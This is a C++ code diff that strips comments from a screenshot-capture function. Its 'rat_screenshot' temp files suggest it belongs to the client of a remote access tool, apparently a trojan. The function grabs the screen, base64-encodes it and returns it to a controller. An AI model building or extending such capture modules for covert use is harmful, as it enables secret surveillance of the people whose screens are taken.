@@ -61,14 +61,14 @@ nlohmann::json ClientScreenshotController::takeScreenshot() {
     reply["controller"] = "screenshot";
     reply["action"] = "take";
     
-    // Generate unique filename with timestamp
+    
     auto now = std::chrono::system_clock::now();
     auto timestamp = std::chrono::system_clock::to_time_t(now);
     std::stringstream ss;
     ss << "/tmp/rat_screenshot_" << timestamp << ".png";
     std::string tempFile = ss.str();
     
-    // Try different screenshot tools in order of preference
+    
     std::string cmd;
     if (system("which scrot >/dev/null 2>&1") == 0) {
         cmd = "scrot " + tempFile + " 2>/dev/null";
@@ -82,7 +82,7 @@ nlohmann::json ClientScreenshotController::takeScreenshot() {
         return reply;
     }
     
-    // Take screenshot
+    
     int result = system(cmd.c_str());
     if (result != 0) {
         reply["success"] = false;
@@ -91,10 +91,10 @@ nlohmann::json ClientScreenshotController::takeScreenshot() {
         return reply;
     }
     
-    // Wait a bit for file to be written
-    usleep(100000); // 100ms
     
-    // Read the screenshot file
+    usleep(100000); 
+    
+    
     std::ifstream file(tempFile, std::ios::binary);
     if (!file.is_open()) {
         reply["success"] = false;
@@ -106,7 +106,7 @@ nlohmann::json ClientScreenshotController::takeScreenshot() {
     std::string fileData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
     file.close();
     
-    // Clean up temp file
+    
     unlink(tempFile.c_str());
     
     if (fileData.empty()) {
@@ -115,7 +115,7 @@ nlohmann::json ClientScreenshotController::takeScreenshot() {
         return reply;
     }
     
-    // Encode to base64
+    
     std::string encoded = base64_encode(fileData);
     
     reply["success"] = true;
@@ -125,4 +125,4 @@ nlohmann::json ClientScreenshotController::takeScreenshot() {
     return reply;
 }
 
-} // namespace Client
+} 
